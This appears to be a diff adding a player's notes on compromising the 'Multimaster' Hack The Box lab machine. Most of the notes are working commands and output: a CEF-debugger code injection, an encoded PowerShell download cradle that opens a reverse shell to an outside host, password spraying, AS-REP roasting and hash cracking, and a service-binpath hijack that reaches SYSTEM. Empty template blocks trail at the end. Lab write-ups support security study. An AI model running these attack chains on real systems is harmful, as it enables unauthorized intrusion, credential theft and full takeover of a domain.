@@ -1,0 +1,658 @@
+Multimaster - HTB Notes - Insane Windows
+
+
+Get reverse shell to cyork user by cefdebug program due to odd ports popping up from netstat reading
+Commands and Output:
+================================================================================================================================
+*Evil-WinRM* PS C:\Users\alcibiades\Documents> cd C:\Windows\system32\spool\drivers\color
+*Evil-WinRM* PS C:\Windows\system32\spool\drivers\color> netstat -an | findstr 127
+  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING
+  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING
+  TCP    127.0.0.1:18977        0.0.0.0:0              LISTENING
+  TCP    127.0.0.1:45811        0.0.0.0:0              LISTENING
+  TCP    127.0.0.1:48271        0.0.0.0:0              LISTENING
+  TCP    127.0.0.1:51726        0.0.0.0:0              LISTENING
+
+..
+..
+..
+================================================================================================================================
+
+Will use cefdebug after discovering with get-process that odd processes like "CODE" are running on the machine
+Commands and Output:
+================================================================================================================================
+  UDP    [::]:64127             *:*
+*Evil-WinRM* PS C:\Windows\system32\spool\drivers\color> get-process
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+    193      15     6160      12908               944   1 Code
+    407      55   133348     169948              1904   1 Code
+    397      22    15092      24504              2236   1 Code
+    309      32    40792      65420              3700   1 Code
+    592      41    38840      81748              5188   1 Code
+    278      53    45312      61188              5688   1 Code
+     85       8     4896       4168              4180   1 conhost
+    372      15     1880       4152               372   0 csrss
+    235      16     1844       4036               464   1 csrss
+    356      31    13736      24288              2276   0 dfsrs
+    170      13     2352       7676              2588   0 dfssvc
+    212      13     3616      12396              3160   0 dllhost
+  10317    7409   129644     127808              2248   0 dns
+    322      21    27372      50412               920   1 dwm
+   1155      50    17712      67580              3224   1 explorer
+      0       0        0          4                 0   0 Idle
+    113      12     1720       5392              2288   0 ismserv
+   1728     154    52540      66332               592   0 lsass
+    676      29    36828      46040              2264   0 Microsoft.ActiveDirectory.WebServices
+    157      10     2636       8676              2912   0 MpCmdRun
+================================================================================================================================
+
+Observing directory program files x86 we find that "Visual Studios" is installed, most likely running the CODE processes
+Commands and Output:
+================================================================================================================================
+*Evil-WinRM* PS C:\> cd "Program Files (x86)"
+*Evil-WinRM* PS C:\Program Files (x86)> ls
+
+
+    Directory: C:\Program Files (x86)
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        7/16/2016   6:23 AM                Common Files
+d-----         1/9/2020   2:39 PM                Internet Explorer
+da----         1/9/2020   1:17 PM                Microsoft SQL Server
+d-----         1/7/2020   7:26 PM                Microsoft Visual Studio 10.0
+d-----         1/7/2020   7:27 PM                Microsoft.NET
+d-----         1/7/2020   9:43 PM                Reference Assemblies
+d-----         1/9/2020   2:39 PM                Windows Defender
+d-----         1/9/2020   2:39 PM                Windows Mail
+d-----         1/9/2020   2:39 PM                Windows Media Player
+d-----        7/16/2016   6:23 AM                Windows Multimedia Platform
+d-----        7/16/2016   6:23 AM                Windows NT
+d-----         1/9/2020   2:39 PM                Windows Photo Viewer
+d-----        7/16/2016   6:23 AM                Windows Portable Devices
+d-----        7/16/2016   6:23 AM                WindowsPowerShell
+================================================================================================================================
+
+CEFdebug exe will be uploaded to try and execute commands from connecting to the remote ports first we will list the url's 
+to the ports.
+Commands and Output:
+================================================================================================================================
+*Evil-WinRM* PS C:\Windows\system32\spool\drivers\color> .\cef
+cef.exe : [2021/05/28 21:17:17:8730] U: There are 3 tcp sockets in state listen.
+    + CategoryInfo          : NotSpecified: ([2021/05/28 21:...n state listen.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[2021/05/28 21:17:37:9187] U: There were 1 servers that appear to be CEF debuggers.
+[2021/05/28 21:17:37:9187] U: ws://127.0.0.1:46854/e13011bc-3af2-4ee0-997f-8e300ee5405a
+================================================================================================================================
+
+From this we will test if we can execute commands on the remote machine with cefdebug
+Commands and Output:
+================================================================================================================================
+*Evil-WinRM* PS C:\Windows\system32\spool\drivers\color> .\cef.exe --code "process.mainModule.require('child_process').exec('ping -n 2 10.10.14.20')" --url ws://127.0.0.1:46854/e13011bc-3af2-4ee0-997f-8e300ee5405a
+cef.exe : [2021/05/28 21:18:44:0346] U: >>> process.mainModule.require('child_process').exec('ping -n 2 10.10.14.20')
+    + CategoryInfo          : NotSpecified: ([2021/05/28 21:...2 10.10.14.20'):String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[2021/05/28 21:18:44:0346] U: <<< ChildProcess
+
+..
+..
+..
+
+┌─[✗]─[user@parrot-virtual]─[~/htb/multimaster]
+└──╼ $sudo tcpdump -i tun0 icmp
+[sudo] password for user: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+21:08:44.117846 IP MEGACORP.LOCAL > 10.10.14.20: ICMP echo request, id 1, seq 3, length 40
+21:08:44.117877 IP 10.10.14.20 > MEGACORP.LOCAL: ICMP echo reply, id 1, seq 3, length 40
+21:08:45.164053 IP MEGACORP.LOCAL > 10.10.14.20: ICMP echo request, id 1, seq 4, length 40
+21:08:45.164076 IP 10.10.14.20 > MEGACORP.LOCAL: ICMP echo reply, id 1, seq 4, length 40
+================================================================================================================================
+
+It works now we can attempt to create a reverse shell payload however will encode it to base64 to make sure that payload goes 
+through and executes. We use the nishang tcp powershell script to get a reverse shell. We modify the main function name and
+delete any help text to avoid any active AV that scans the file in memory.
+Commands and Output:
+================================================================================================================================
+*Evil-WinRM* PS C:\Windows\system32\spool\drivers\color> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20:8000/shell.ps1')
+
+..
+..
+..
+
+└──╼ $rlwrap nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.179.
+Ncat: Connection from 10.10.10.179:50340.
+Windows PowerShell running as user tushikikatomo on MULTIMASTER
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+================================================================================================================================
+
+The connect back works so now we have to encode the payload into base64 but also make sure that it is based off windows little
+endian otherwise the encoding will not work.
+Commands and Output:
+================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/multimaster]
+└──╼ $echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20:8000/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMAA6ADgAMAAwADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA=
+================================================================================================================================
+
+With that out of the way we prepare the payload and run cefdebu again on the victim machine to find the new url being run.
+Commands and Output:
+================================================================================================================================
+*Evil-WinRM* PS C:\Windows\system32\spool\drivers\color> .\cef.exe --code "process.mainModule.require('child_process').exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMAA6ADgAMAAwADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA=')" --url ws://127.0.0.1:9107/29307a40-9cee-4fac-a1fd-06215f386783
+cef.exe : [2021/05/28 21:28:50:5957] U: >>> process.mainModule.require('child_process').exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMAA6ADgAMAAwA...
+    + CategoryInfo          : NotSpecified: ([2021/05/28 21:...AA6ADgAMAAwA...:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+[2021/05/28 21:28:50:5957] U: <<< ChildProcess
+================================================================================================================================
+
+And we get a connect back and as the user cyork
+Commands and Output:
+================================================================================================================================
+─╼ $rlwrap nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.179.
+Ncat: Connection from 10.10.10.179:50379.
+Windows PowerShell running as user cyork on MULTIMASTER
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+whoami
+megacorp\cyork
+PS C:\Program Files\Microsoft VS Code> 
+================================================================================================================================
+
+We can now attempt to navigate to the inetpub directory that we could not access with the first user and we now can access it.
+Commands and Output:
+================================================================================================================================
+cd c:\inetpub\wwwroot
+ls
+    Directory: C:\inetpub\wwwroot
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----         1/7/2020   9:28 PM                aspnet_client                                                         
+d-----         1/7/2020   9:28 PM                assets                                                                
+d-----         1/7/2020   9:28 PM                bin                                                                   
+d-----         1/7/2020   9:28 PM                Content                                                               
+d-----         1/7/2020  10:50 PM                css                                                                   
+d-----         1/7/2020   9:28 PM                fonts                                                                 
+d-----         1/7/2020   9:28 PM                images                                                                
+d-----         1/7/2020   9:28 PM                img                                                                   
+d-----         1/7/2020  10:50 PM                js                                                                    
+d-----         1/7/2020   9:28 PM                Scripts                                                               
+d-----         1/7/2020   9:28 PM                Views                                                                 
+-a----         1/6/2020   4:49 PM           3614 favicon.ico                                                           
+-a----         1/6/2020  10:36 PM             98 Global.asax                                                           
+-a----         1/7/2020  10:52 PM           1098 index.html                                                            
+-a----         1/9/2020   4:13 AM           3640 Web.config
+================================================================================================================================
+
+If we examine the contents of the wwwroot directory in the bin folder we find an interesting file
+Commands and Output:
+================================================================================================================================
+cd bin
+ls
+
+
+    Directory: C:\inetpub\wwwroot\bin
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----         1/7/2020   9:28 PM                roslyn                                                                
+-a----        2/21/2013   7:13 PM         102912 Antlr3.Runtime.dll                                                    
+-a----        2/21/2013   7:13 PM         431616 Antlr3.Runtime.pdb                                                    
+-a----        5/24/2018   1:08 AM          40080 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll                
+-a----        7/24/2012  11:18 PM          45416 Microsoft.Web.Infrastructure.dll                                      
+-a----         1/9/2020   4:13 AM          13824 MultimasterAPI.dll                                                    
+-a----         1/9/2020   4:13 AM          28160 MultimasterAPI.pdb                                                    
+-a----        2/17/2018   8:14 PM         664576 Newtonsoft.Json.dll                                                   
+-a----       11/27/2018  11:30 PM         178808 System.Net.Http.Formatting.dll                                        
+-a----       11/27/2018  11:28 PM          27768 System.Web.Cors.dll                                                   
+-a----        1/27/2015   2:34 PM         139976 System.Web.Helpers.dll                                                
+-a----       11/27/2018  11:31 PM          39352 System.Web.Http.Cors.dll                                              
+-a----       11/27/2018  11:31 PM         455096 System.Web.Http.dll                                                   
+-a----        1/31/2018  10:49 PM          77520 System.Web.Http.WebHost.dll                                           
+-a----        1/27/2015   2:32 PM         566472 System.Web.Mvc.dll                                                    
+-a----        2/11/2014   1:56 AM          70864 System.Web.Optimization.dll                                           
+-a----        1/27/2015   2:32 PM         272072 System.Web.Razor.dll                                                  
+-a----        1/27/2015   2:34 PM          41672 System.Web.WebPages.Deployment.dll                                    
+-a----        1/27/2015   2:34 PM         211656 System.Web.WebPages.dll                                               
+-a----        1/27/2015   2:34 PM          39624 System.Web.WebPages.Razor.dll                                         
+-a----        7/17/2013   4:33 AM        1276568 WebGrease.dll                                        
+================================================================================================================================
+
+
+We find "MultimasterAPI.dll" which is a bit odd. We can copy it to the "C:\Windows\system32\spool\drivers\color" so that our
+first windows remoting user can download it for us in evil-winrm.
+Commands and Output:
+================================================================================================================================
+cp MultimasterAPI.dll C:\Windows\system32\spool\drivers\color
+PS C:\inetpub\wwwroot\bin> 
+
+..
+..
+..
+
+*Evil-WinRM* PS C:\Windows\system32\spool\drivers\color> download MultimasterAPI.dll
+Info: Downloading C:\Windows\system32\spool\drivers\color\MultimasterAPI.dll to MultimasterAPI.dll
+
+                                                             
+Info: Download successful!
+================================================================================================================================
+
+We can now examine the dll with strings, but find nothing of interest. We can try and decompile the file to furhter examine, but
+instead do more examination with strings by giving it an encoding option that will select character size and endianess
+Commands and Output:
+================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/multimaster]
+└──╼ $strings -e l MultimasterAPI.dll 
+'C]v}
+{{ action = {0}, id = {1} }}
+{{ id = {0} }}
+~/bundles/jquery
+~/Scripts/jquery-{version}.js
+~/bundles/jqueryval
+~/Scripts/jquery.validate*
+~/bundles/modernizr
+~/Scripts/modernizr-*
+~/bundles/bootstrap
+~/Scripts/bootstrap.js
+~/Content/css
+~/Content/bootstrap.css
+~/Content/site.css
+{resource}.axd/{*pathInfo}
+Default
+{controller}/{action}/{id}
+Index
+DefaultApi
+api/{controller}/{id}
+/api/getColleagues
+UNION
+SELECT
+JOIN
+EXEC
+ORDER
+WAITFOR
+DELAY
+FROM
+WHERE
+LIKE
+INFORMATION_SCHEMA
+MASTER
+{ "info" : "MegaCorp API" }
+application/json
+server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
+name
+Select * from Colleagues where name like '%{0}%'
+position
+email
+image
+data
+VS_VERSION_INFO
+VarFileInfo
+Translation
+StringFileInfo
+000004b0
+Comments
+CompanyName
+FileDescription
+MultimasterAPI
+FileVersion
+1.0.0.0
+InternalName
+MultimasterAPI.dll
+LegalCopyright
+Copyright 
+  2020
+LegalTrademarks
+OriginalFilename
+MultimasterAPI.dll
+ProductName
+MultimasterAPI
+ProductVersion
+1.0.0.0
+Assembly Version
+1.0.0.0
+================================================================================================================================
+
+We find a password!
+"server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;"
+
+We can now use crackmapexec to try and authenticate with any user from our usernames.txt and see if it works.
+Commands and Output:
+================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/multimaster]
+└──╼ $crackmapexec smb 10.10.10.179 -u usernames.txt -p 'D3veL0pM3nT!'
+SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\lana:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\aldom:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\alyx:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\cyork:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\egre55:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ilee:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\james:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\jorden:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\minato:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\minatotw:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\nbourne:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\rmartin:D3veL0pM3nT! STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT!
+================================================================================================================================
+
+It works for user sbauer, now we can attempt to login using winrm
+Commands and Output:
+================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/multimaster]
+└──╼ $crackmapexec winrm 10.10.10.179 -u sbauer -p 'D3veL0pM3nT!'
+WINRM       10.10.10.179    5985   MULTIMASTER      [*] Windows 10.0 Build 14393 (name:MULTIMASTER) (domain:MEGACORP.LOCAL)
+WINRM       10.10.10.179    5985   MULTIMASTER      [*] http://10.10.10.179:5985/wsman
+WINRM       10.10.10.179    5985   MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT! (Pwn3d!)
+================================================================================================================================
+
+
+Now that we have confirmed we can login as sbauer using winrm we can open up bloodhound and mark the user as pwned and see
+if there are any other paths to further escalate.
+
+For the bloodhound creds we just enter a blank username and password if neo4j authentication is set to none.
+More info in the following link:
+https://stackoverflow.com/questions/30602543/forgot-neo4j-server-password
+
+Based on the bloodhound visualization of sbauer, we come to find that it has "GenericAll" access to "Account Operators" and
+"Account Operators" has "WriteDacl" to "Enterprise Admins". 
+
+Looking at the WriteDACL help page it states the folllowing:
+Commands and Output:
+================================================================================================================================
+To abuse WriteDacl to a group object, you may grant yourself the AddMember privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView.
+
+You may need to authenticate to the Domain Controller as a member of ENTERPRISE ADMINS@MEGACORP.LOCAL if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
+
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+
+Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ENTERPRISE ADMINS@MEGACORP.LOCAL:
+================================================================================================================================
+
+However this is not what we are looking for instead we have to pivot to the jorden user for which sbauer has "GenericWrite" 
+privileges to.
+Commands and Output:
+================================================================================================================================
+A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with Get-DomainSPNTicket.
+
+You may need to authenticate to the Domain Controller as SBAUER@MEGACORP.LOCAL if you are not running a process as that user. To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):
+
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+
+Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as SBAUER@MEGACORP.LOCAL:
+
+Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
+
+After running this, you can use Get-DomainSPNTicket as follows:
+
+Get-DomainSPNTicket -Credential $Cred harmj0y | fl
+
+The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:
+
+Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname
+================================================================================================================================
+
+We can enable kerboroasting on that user with the generic write. It's creating a service principle name for that user which then 
+exposes the password in Active Directory.
+
+So now we login to as sbauer.
+Commands and Output:
+================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/multimaster]
+└──╼ $evil-winrm -i 10.10.10.179 -u sbauer -p 'D3veL0pM3nT!'
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\sbauer\Documents>
+================================================================================================================================
+
+We want to get the jorden user and make him kerborastable
+Commands and Output:
+================================================================================================================================
+*Evil-WinRM* PS C:\Users\sbauer\Documents> Get-ADUser Jorden
+
+
+DistinguishedName : CN=Jorden Mclean,OU=Athens,OU=Employees,DC=MEGACORP,DC=LOCAL
+Enabled           : True
+GivenName         : Jorden
+Name              : Jorden Mclean
+ObjectClass       : user
+ObjectGUID        : 0fa62545-eff1-4805-b16f-a18cf4217418
+SamAccountName    : jorden
+SID               : S-1-5-21-3167813660-1240564177-918740779-3110
+Surname           : Mclean
+UserPrincipalName : jorden@MEGACORP.LOCAL
+
+
+*Evil-WinRM* PS C:\Users\sbauer\Documents> Get-ADUser Jorden | Set-ADAccountControl -DoesNotRequirePreAuth $true
+================================================================================================================================
+
+
+We can now use an impacket script GetNPUsers which Queries target domain for users with 'Do not require Kerberos preauthentication' 
+set and export their TGTs for cracking
+/usr/share/doc/python3-impacket/examples/GetNPUsers.py
+Commands and Output:
+================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/multimaster]
+└──╼ $/usr/share/doc/python3-impacket/examples/GetNPUsers.py megacorp.local/jorden -request
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Cannot authenticate jorden, getting its TGT
+$krb5asrep$23$jorden@MEGACORP.LOCAL:b226d0b9a6021b7b4fd1329b8b8abc0f$8a8ddd00e141fce247551f818a3b7c33c719be075a7f39326eff8a38044b3024f08191a1fe3b98ef7ba3c3b252f0b5b930e65eed550bb5a70811094d95967e4e9c6c078a1abd9f258057d30c72dcf3b63cc23be6649ff906ad8660d18173b74448c5a954e6e2238a443ffd72466c17380379e2c1b3714d3b0bd4d05fb80b335e7cab04a8f1d509a3ce1bd1a700d36d86759f9bb5137ad84613c19e70b108337c1acd15233816bfee12c8ec6b2725ff1d3e8b0610f304f2d30b83eb76b2d76761797f339f8017963ea80330ee1c5b81621e42cc4fd6329ef86343d48f618f5ad3418ba4bf0d2958a5a1a2db18b4f7b753
+================================================================================================================================
+
+We now have a hash, good opsec would make sure to make PreAuth False to prevent the leaking coming from the password query
+Commands and Output:
+================================================================================================================================
+*Evil-WinRM* PS C:\Users\sbauer\Documents> Get-ADUser Jorden | Set-ADAccountControl -DoesNotRequirePreAuth $false
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/multimaster]
+└──╼ $/usr/share/doc/python3-impacket/examples/GetNPUsers.py megacorp.local/jorden -request
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Cannot authenticate jorden, getting its TGT
+[-] User jorden doesn't have UF_DONT_REQUIRE_PREAUTH set
+================================================================================================================================
+
+We now have a hash we can try and crack it with hashcat
+Commands and Output:
+================================================================================================================================
+./hashcat -m 18200 ../krb ../rockyou.txt 
+hashcat (v6.2.1-71-g1785dfe08) starting...
+
+Successfully initialized NVIDIA CUDA library.
+
+Failed to initialize NVIDIA RTC library.
+
+..
+..
+..
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 175 MB
+
+Dictionary cache built:
+* Filename..: ../rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+$krb5asrep$23$jorden@MEGACORP.LOCAL:b226d0b9a6021b7b4fd1329b8b8abc0f$8a8ddd00e141fce247551f818a3b7c33c719be075a7f39326eff8a38044b3024f08191a1fe3b98ef7ba3c3b252f0b5b930e65eed550bb5a70811094d95967e4e9c6c078a1abd9f258057d30c72dcf3b63cc23be6649ff906ad8660d18173b74448c5a954e6e2238a443ffd72466c17380379e2c1b3714d3b0bd4d05fb80b335e7cab04a8f1d509a3ce1bd1a700d36d86759f9bb5137ad84613c19e70b108337c1acd15233816bfee12c8ec6b2725ff1d3e8b0610f304f2d30b83eb76b2d76761797f339f8017963ea80330ee1c5b81621e42cc4fd6329ef86343d48f618f5ad3418ba4bf0d2958a5a1a2db18b4f7b753:rainforest786
+
+..
+..
+..
+================================================================================================================================
+
+We find that user jorden has password of rainforest786.
+In bloodhound we can now mark Jorden as owned and find shortest paths from known principles.
+We go back to "C:\Windows\system32\spool\drivers\color" after we login with the jorden user.
+
+Commands and Output:
+================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/multimaster]
+└──╼ $evil-winrm -i 10.10.10.179 -u jorden -p rainforest786
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\jorden\Documents> cd C:\Windows\system32\spool\drivers\color
+*Evil-WinRM* PS C:\Windows\system32\spool\drivers\color> ls
+
+
+    Directory: C:\Windows\system32\spool\drivers\color
+================================================================================================================================
+
+We can try running WinPEAS again and see what we can find this time.
+Commands and Output:
+================================================================================================================================
+  [+] Looking if you can modify any service registry
+   [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
+
+..
+..
+..
+    HKLM\system\currentcontrolset\services\usbprint (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\usbser (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\USBSTOR (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\usbuhci (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\USBXHCI (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\UserDataSvc (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\UserDataSvc_5a501 (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\UserManager (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\UsoSvc (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\VaultSvc (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\vdrvroot (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\vds (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\VerifierExt (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\VGAuthService (Server Operators [WriteData/CreateFiles GenericWrite])
+    HKLM\system\currentcontrolset\services\vhdmp (Server Operators [WriteData/CreateFiles GenericWrite])
+..
+..
+..
+
+================================================================================================================================
+
+We come to find that the Generic Write Provides Write Permissions to many services. We can edit the "UsoSvc" service via the
+following commands to give ourselves a reverse shell.
+    
+Commands and Output:
+================================================================================================================================
+*Evil-WinRM* PS C:\Windows\system32\spool\drivers\color> sc.exe config usosvc start= auto
+[SC] ChangeServiceConfig SUCCESS
+*Evil-WinRM* PS C:\Windows\system32\spool\drivers\color> sc.exe config UsoSvc binpath="c:\windows\system32\cmd.exe /c powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMAA6ADgAMAAwADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA="
+[SC] ChangeServiceConfig SUCCESS
+*Evil-WinRM* PS C:\Windows\system32\spool\drivers\color> sc.exe start usosvc
+
+================================================================================================================================
+
+We use the previous enocoded shell and setup our python http server to serve our powershell script and set up a netcat listener 
+on port 9001
+Commands and Output:
+================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/multimaster]
+└──╼ $rlwrap nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.179.
+Ncat: Connection from 10.10.10.179:50814.
+Windows PowerShell running as user MULTIMASTER$ on MULTIMASTER
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+whoami
+nt authority\system
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
+
+Commands and Output:
+================================================================================================================================
+================================================================================================================================
